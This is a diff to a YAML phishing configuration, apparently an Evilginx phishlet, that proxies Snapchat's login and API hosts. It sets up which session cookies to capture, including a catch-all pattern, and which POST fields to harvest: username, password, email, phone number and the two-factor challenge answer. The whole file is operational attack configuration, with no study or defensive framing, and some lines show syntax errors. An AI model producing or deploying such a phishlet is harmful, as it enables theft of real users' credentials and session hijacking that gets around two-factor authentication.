@@ -7,15 +7,15 @@ redirect_url: 'https://accounts.snapchat.com/v2/download-my-data'
 
 
 proxy_hosts:
-  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'snapchat.com', session: true, is_landing: true}
-  - {phish_sub: '', orig_sub: '', domain: 'snapchat.com', session: true, is_landing: false}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'snapchat.com', session: true, is_landing: false}
-  - {phish_sub: 'csp-central', orig_sub: 'csp-central', domain: 'appspot.com', session: true, is_landing: false}
-  - {phish_sub: 'us-central1-gcp', orig_sub: 'us-central1-gcp', domain: 'api.snapchat.com', session: true, is_landing: false}
-  - {phish_sub: 'gcp', orig_sub: 'gcp', domain: 'api.snapchat.com', session: true, is_landing: false}
-  - {phish_sub: 'aws', orig_sub: 'aws', domain: 'api.snapchat.com', session: true, is_landing: false}
-  - {phish_sub: 'static', orig_sub: 'static', domain: 'snapchat.com', session: false, is_landing: false}
-  - {phish_sub: 'snap-api', orig_sub: 'snap-api', domain: 'arkoselabs.com', session: true, is_landing: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'snapchat.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'snapchat.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'snapchat.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'csp-central', orig_sub: 'csp-central', domain: 'appspot.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'us-central1-gcp', orig_sub: 'us-central1-gcp', domain: 'api.snapchat.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gcp', orig_sub: 'gcp', domain: 'api.snapchat.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aws', orig_sub: 'aws', domain: 'api.snapchat.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'snapchat.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'snap-api', orig_sub: 'snap-api', domain: 'arkoselabs.com', session: true, is_landing: false, auto_filter: true}
 
 
 
@@ -33,49 +33,32 @@ proxy_hosts:
 
   
 
-sub_filters:
-  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+# sub_filters:
+#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+#   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 
 auth_tokens:
   - domain: '.snapchat.com'
-    keys: ['sc-a-nonce', '.*,regexp']
-  - domain: 'accounts.snapchat.com'
-    keys: [
-      'web_client_id',
-      'sc-cookies-accepted',
-      'sc-a-csrf',
-      'sc-a-session',
-      'xsrf_token',
-      '_sc-sid',
-      'sc-wcid',
-      'sc-a-nonce',
-      '_scid',
-      '_scid_r',
-      '__Host-sc-authn-session-payload',
-      '__Host-X-Snap-Client-Cookie',
-      '__Host-sc-a-nonce',
-      '__Host-sc-a-auth-session',
-      '.*,regexp'
-    ]
+    keys: ['sc-a-nonce', web_client_id', 'sc-cookies-accepted', 'sc-a-csrf', 'sc-a-session', 'xsrf_token', '_sc-sid', 'sc-wcid', '_scid', '_scid_r', '__Host-sc-authn-session-payload', '__Host-X-Snap-Client-Cookie', '__Host-sc-a-nonce', '__Host-sc-a-auth-session', '.*,regexp']
    
 
 
 auth_urls:
-  - '/accounts/sso?client_id=snapchat-com-metrics'  
+  - '/v2/welcome'
+  - '/accounts/welcome'
 
 
 
 credentials:
   username:
-    key: "ai_token"
+    key: "accountIdentifier"
     search: "(.*)"
     type: "post"
   password:
@@ -83,25 +66,21 @@ credentials:
     search: "(.*)"
     type: "post"
   custom:
-    key: "email"
-    search: "email\":\"(.*?)\""
-    type: "post"
-  custom:
-    key: 'accountIdentifier'
-    search: "(.*)"
-    type: 'post'
-  custom:
-    key: 'twoFAChallengeAnswer'
-    search: "(.*)"
-    type: 'post'
-  custom:
-    key: 'accountIdentifierCountryCode'
-    search: "(.*)"
-    type: 'post'
-  custom:
-    key: 'accountIdentifierPhoneNumber'
-    search: "(.*)"
-    type: 'post'
+    - key: "email"
+      search: "email\":\"(.*?)\""
+      type: "post"
+    - key: 'ai_token'
+      search: "(.*)"
+      type: 'post'
+    - key: 'twoFAChallengeAnswer'
+      search: "(.*)"
+      type: 'post'
+    - key: 'accountIdentifierCountryCode'
+      search: "(.*)"
+      type: 'post'
+    - key: 'accountIdentifierPhoneNumber'
+      search: "(.*)"
+      type: 'post'
 
 
 login:
